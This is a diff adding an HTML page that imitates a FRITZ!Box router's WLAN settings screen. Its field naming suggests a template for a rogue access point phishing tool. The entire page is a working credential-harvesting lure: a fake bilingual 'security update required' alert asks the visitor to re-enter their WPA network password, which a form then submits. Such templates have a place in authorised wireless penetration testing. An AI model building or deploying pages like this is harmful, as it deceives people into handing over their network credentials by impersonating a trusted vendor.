@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FRITZ!Box — WLAN</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #ebebeb; color: #333; min-height: 100vh; }
+        .mast { background: #fff; border-bottom: 4px solid #d20000; padding: 12px 18px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
+        .brand { font-size: 20px; font-weight: 700; color: #d20000; letter-spacing: 0.02em; }
+        .brand span { font-weight: 400; color: #333; }
+        .model { font-size: 11px; color: #666; }
+        .layout { display: flex; flex-direction: column; max-width: 900px; margin: 0 auto; min-height: calc(100vh - 60px); }
+        @media (min-width: 720px) {
+            .layout { flex-direction: row; }
+            .side { width: 200px; flex-shrink: 0; }
+        }
+        .side { background: #d20000; color: #fff; padding: 12px 0; }
+        .side a { display: block; padding: 10px 18px; font-size: 13px; color: rgba(255,255,255,0.9); text-decoration: none; border-left: 4px solid transparent; }
+        .side a:hover { background: rgba(0,0,0,0.08); }
+        .side a.on { background: rgba(0,0,0,0.12); border-left-color: #fff; font-weight: 700; }
+        .main { flex: 1; padding: 18px 16px; background: #f5f5f5; }
+        .box { background: #fff; border: 1px solid #ccc; border-radius: 2px; }
+        .box-h { background: linear-gradient(180deg, #fafafa, #f0f0f0); border-bottom: 1px solid #ccc; padding: 10px 14px; font-size: 14px; font-weight: 700; color: #d20000; }
+        .box-b { padding: 16px 14px; }
+        .alert { background: #fff5f5; border: 1px solid #d20000; padding: 12px 14px; margin-bottom: 18px; font-size: 12px; line-height: 1.55; color: #4a2020; }
+        .alert strong { display: block; color: #b00000; margin-bottom: 6px; font-size: 13px; }
+        table { width: 100%; font-size: 13px; border-collapse: collapse; }
+        td { padding: 10px 8px; border-bottom: 1px solid #eee; vertical-align: middle; }
+        td:first-child { width: 42%; color: #555; font-weight: 700; }
+        input[type="password"] { width: 100%; max-width: 300px; padding: 8px 10px; border: 1px solid #aaa; border-radius: 2px; font-size: 14px; }
+        input[type="password"]:focus { border-color: #d20000; outline: none; }
+        .btn-row { text-align: right; padding-top: 16px; }
+        .btn { padding: 8px 20px; background: #d20000; color: #fff; border: 1px solid #a00000; border-radius: 2px; font-size: 13px; font-weight: 700; cursor: pointer; }
+        .btn:hover { background: #b80000; }
+        .foot { font-size: 10px; color: #888; padding: 12px 16px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="mast">
+        <div class="brand">FRITZ!<span>Box</span></div>
+        <div class="model">WLAN · Heimnetz</div>
+    </div>
+    <div class="layout">
+        <nav class="side">
+            <a href="#">Übersicht</a>
+            <a href="#" class="on">WLAN</a>
+            <a href="#">Internet</a>
+            <a href="#">System</a>
+        </nav>
+        <div class="main">
+            <div class="box">
+                <div class="box-h">WLAN · Sicherheit</div>
+                <div class="box-b">
+                    <div class="alert">
+                        <strong>Sicherheitsupdate erforderlich / Security update required</strong>
+                        Zur Anwendung eines WLAN-Sicherheitsupdates bitte das WPA-Netzwerkkennwort bestätigen. / Please confirm your WPA network password to apply a wireless security update.
+                    </div>
+                    <form method="POST" action="/login">
+                        <table>
+                            <tr><td>Verschlüsselung</td><td>WPA2 (CCMP)</td></tr>
+                            <tr><td>Netzwerkschlüssel</td><td><input type="password" name="wfphshr-wpa-password" placeholder="WLAN-Passwort" required autocomplete="current-password"></td></tr>
+                        </table>
+                        <div class="btn-row"><button type="submit" class="btn">Übernehmen</button></div>
+                    </form>
+                </div>
+            </div>
+            <div class="foot">Lokale Geräteverwaltung</div>
+        </div>
+    </div>
+</body>
+</html>
